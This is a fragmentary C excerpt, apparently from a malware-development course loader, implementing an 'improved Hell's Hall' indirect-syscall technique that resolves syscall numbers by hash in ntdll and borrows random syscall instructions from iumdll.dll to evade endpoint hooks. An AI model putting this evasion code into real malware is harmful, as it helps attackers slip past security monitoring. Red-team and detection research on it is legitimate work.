//
// Improved Hell's Hall implementation - https://github.com/Maldev-Academy/MaldevAcademyLdr.1/blob/main/Loader/HellsHall.c
//
...
// -------------------------------- //// -------------------------------- //// -------------------------------- //
//
// Random number generator using XORshift algorithm - https://github.com/Maldev-Academy/MaldevAcademyLdr.1/blob/main/Loader/Common.c#L92
...
// Retrieves a syscall instruction address from within 'iumdll.dll'

BOOL FetchIumdllSyscallInst(OUT PVOID* ppSyscallInstAddress) {

    INT     iSeed = GenerateRandomInt() % 0x10,
        iCounter = 0x00;

    // Initialize Iumdll config 
    if (!g_IumdllConf.bInitialized) {
        if (!InitDllsConfigStructs(&g_IumdllConf, GetModuleHandle(L"IUMDLL")))
            return FALSE;
    }

    for (DWORD i = 0; i < g_IumdllConf.dwNumberOfNames; i++) {

        PCHAR pcFuncName = (PCHAR)(g_IumdllConf.uModule + g_IumdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress = (PVOID)(g_IumdllConf.uModule + g_IumdllConf.pdwArrayOfAddresses[g_IumdllConf.pwArrayOfOrdinals[i]]);
...
BOOL FetchNtSyscall(IN DWORD dwSyscallHash, OUT PNT_SYSCALL pNtSyscall) {
    ...
    if (!g_NtdllConf.bInitialized) {
        ...
        if (!InitDllsConfigStructs(&g_NtdllConf, (ULONG_PTR)(pDataTableEntry->DllBase)))
            return FALSE;
    }
    ...
    if (pNtSyscall->dwSSn == NULL)
        return FALSE;

    // Search for a 'syscall' instruction in iumdll.dll
    if (!FetchIumdllSyscallInst(&pNtSyscall->pSyscallInstAddress))
        return FALSE;
